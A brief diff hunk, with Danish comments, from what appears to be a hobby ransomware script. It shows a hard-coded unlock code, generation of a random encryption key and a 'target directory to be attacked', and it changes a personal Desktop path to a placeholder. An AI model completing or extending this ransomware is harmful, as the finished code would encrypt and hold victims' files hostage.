@@ -10,7 +10,7 @@ unlockcode = "sesam"
 #16 byte nøgle til kryptering
 key = get_random_bytes(16)
 #directory der bliver angrebet
-target_dir = "C:/Users/maflp/Desktop/Ransomware/ReallyImportant"
+target_dir = "path/to/target/folder"
 
 def get_files():
     #en liste med de filer der bliver hentet
